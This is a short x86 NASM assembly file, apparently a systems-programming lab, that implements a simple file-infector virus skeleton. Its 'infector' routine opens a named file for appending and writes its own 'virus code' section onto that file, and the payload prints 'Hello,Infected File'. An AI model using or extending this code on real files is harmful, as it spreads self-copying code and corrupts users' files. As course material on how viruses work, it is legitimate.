
section .data
msg:db "Hello,Infected File",10
file:dd 0

section .text
global _start
global system_call
global infection 
global infector
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
  system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
 infection:
    push ebp         ; Save caller state
    mov ebp, esp
    pushad           ; Save some more caller state

    mov eax, 4       ; System call for write
    mov ebx, 1       ; File descriptor (stdout)
    mov ecx, msg     ; Pointer to the message string
    mov edx, 20      ; Length of the message

    int 0x80         ; Interrupt to invoke the kernel (syscall)

    popad            ; Restore caller state (registers)
    pop ebp          ; Restore caller state
    ret              ; Return from the function


infector:
    push ebp         ; Save caller state
    mov ebp, esp
    pushad           ; Save some more caller state

; Open file for appending
    mov eax, 5       ; System call for open
    mov ebx, [ebp + 8]   ; File name
    mov ecx,dword 2001o   ; Flags for append and write
    int 0x80         ; Invoke kernel

; Save the file descriptor
    mov edi, eax        ;edi = fd



; Write the executable code to the file
    mov eax, 4       ; System call for write
    mov ebx, edi  ; File descriptor
    mov ecx, code_start  ; Pointer to start of virus code
    mov edx, code_end - code_start ; Length of virus code
    int 0x80         ; Invoke kernel

; Close the file
    mov eax, 6       ; System call for close
    mov ebx, edi  ; File descriptor
    int 0x80         ; Invoke kernel

; Restore caller state
    popad            ; Restore caller state (registers)
    pop ebp          ; Restore caller state
    ret              ; Return from the function

code_end:


